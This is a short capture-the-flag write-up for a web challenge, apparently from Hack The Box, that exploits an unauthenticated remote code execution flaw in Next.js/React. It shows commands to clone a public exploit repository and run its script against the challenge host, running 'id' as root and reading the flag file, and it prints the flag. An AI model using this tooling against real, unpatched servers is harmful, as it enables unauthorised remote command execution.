# ReactOOPS Writeup

**Challenge Name:** ReactOOPS
**Difficulty:** Very Easy
**Category:** Web
**Vulnerability:** CVE-2025-55182 (Unauthenticated RCE in React/Next.js)

## Challenge Description
NexusAI's polished assistant interface promises adaptive learning and seamless interaction. Beneath its reactive front end, a hidden flaw exists.

## Analysis
The application is built using **Next.js 16.0.6** and **React 19**. 
Reviewing the `package.json`:
```json
"dependencies": {
  "next": "16.0.6",
  "react": "^19",
  "react-dom": "^19"
}
```

## Solution
This challenge is a reference to the **React2Shell** vulnerability (**CVE-2025-55182**), which is a critical unauthenticated Remote Code Execution (RCE) vulnerability in React.

### Exploitation Steps
1. **Tooling:** Clone the `react2shell` exploit repository.
   ```bash
   git clone https://github.com/freeqaz/react2shell
   cd react2shell
   chmod +x exploit-redirect.sh
   ```

2. **Command Execution:** Run the exploit against the target to execute commands.
   
   Checking identity:
   ```bash
   ./exploit-redirect.sh 154.57.164.66:30455 "id"
   # Output: uid=0(root) gid=0(root) ...
   ```

   Finding the flag:
   ```bash
   ./exploit-redirect.sh 154.57.164.66:30455 "cat /app/flag.txt"
   ```

3. **Result:**
   The exploit successfully exfiltrates the command output via an HTTP 303 Redirect.

**Flag:** `HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}`
